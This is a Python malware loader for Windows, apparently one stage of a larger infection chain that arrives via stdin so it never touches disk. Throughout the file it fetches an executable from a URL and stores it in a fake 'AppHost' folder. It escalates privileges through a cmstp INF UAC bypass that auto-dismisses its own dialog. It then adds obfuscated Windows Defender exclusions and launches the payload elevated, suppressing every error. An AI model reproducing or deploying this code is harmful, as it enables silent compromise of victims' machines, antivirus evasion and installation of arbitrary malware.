# tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: stage the exe ->Administrator lift via cmstp (majanito shape)
# -> defender exclusions under the lifted token -> run the exe elevated.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

EXE_NAME = "tung_dbg_carrier.exe"
if EXE_URL:
    try:
        n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n:
            EXE_NAME = n
    except Exception:
        pass
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_CLOSE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
VK_RETURN = 0x0D
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def kill_process(name):
    try:
        subprocess.run(["taskkill", "/IM", name, "/F"], creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def kill_all_cmstp():
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b"cmstp" in pe.szExeFile.lower():
                h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
                if h:
                    kernel32.TerminateProcess(h, 0)
                    kernel32.CloseHandle(h)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
class Dismisser:
    def __init__(self, title):
        self.title = title
        self.done = threading.Event()

    def find_window(self):
        for cls, title in [(None, self.title), ("#32770", None), ("DirectUIHWND", None),
                           (None, "Connection Manager Profile Installer")]:
            hwnd = user32.FindWindowW(cls, title)
            if hwnd and user32.IsWindowVisible(hwnd):
                return hwnd
        return None

    def dismiss(self, hwnd):
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetForegroundWindow(hwnd)
        btn = user32.FindWindowExW(hwnd, None, "Button", None)
        if btn:
            user32.PostMessageW(btn, BM_CLICK, 0, 0)
        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)

    def run(self):
        for _ in range(500):
            if self.done.is_set():
                return
            hwnd = self.find_window()
            if hwnd:
                self.dismiss(hwnd)
                self.done.set()
                return
            time.sleep(0.01)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=5.0):
        self.done.wait(timeout)


def build_inf(cmd, svc_name):
    s1, s2, s3 = f"D{rand_str(4)}", f"C{rand_str(4)}", f"L{rand_str(4)}"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
RunPreSetupCommands={s2}
[{s2}]
{cmd}
taskkill /IM cmstp.exe /F
[{s1}]
49000,49001={s3}, 7
[{s3}]
"HKLM", "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # quoted exe path (run_elevated) and real powershell invocations pass
    # through untouched; only BARE snippets get the wrapper
    if not (c.lower().startswith("powershell") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    dismisser.start()
    try:
        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
    except Exception:
        return False

    dismisser.wait(5.0)
    time.sleep(0.3)
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False


# ---- defender exclusions (sample 9_macros shape, our paths) ------------------
def set_defender_exclusions():
    """$env: expansions (no baked absolute paths), one array, ExclusionProcess
    list — and the lift call carries the FULL wrapper + quoted -C payload,
    exactly like payload_script.py. the bare-snippet shape is what produced
    the 'cannot find the file specified' dialog."""
    ps = ("$a='Add-Mp'+'Preference';"
          "$p=@(($env:LOCALAPPDATA+'\\Microsoft\\Windows\\AppHost'),"
          "($env:LOCALAPPDATA+'\\Microsoft\\Windows'));"
          "& $a -ExclusionPath $p -EA 0;"
          f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
    if is_elevated():
        try:
            subprocess.run(["powershell", "-NoP", "-W", "Hidden", "-C", ps],
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
        except Exception:
            pass
    else:
        uac_bypass(f'powershell -NoP -W Hidden -C "{ps}"')


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path):
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < 50000:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data):
    kill_process(EXE_NAME)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    set_defender_exclusions()

    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    run_elevated(EXE_PATH)


main()
